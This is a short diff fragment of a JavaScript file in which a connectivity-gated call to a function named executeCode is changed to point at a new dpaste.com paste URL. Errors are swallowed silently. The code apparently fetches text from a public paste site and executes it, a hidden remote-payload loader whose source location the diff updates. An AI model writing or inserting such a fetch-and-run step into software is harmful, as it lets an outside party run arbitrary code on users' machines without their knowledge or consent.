@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://dpaste.com/9LDCR7G6B.txt');
+                await executeCode('https://dpaste.com/5539B4J5G.txt');
             } catch (error) {
             }
         } else {
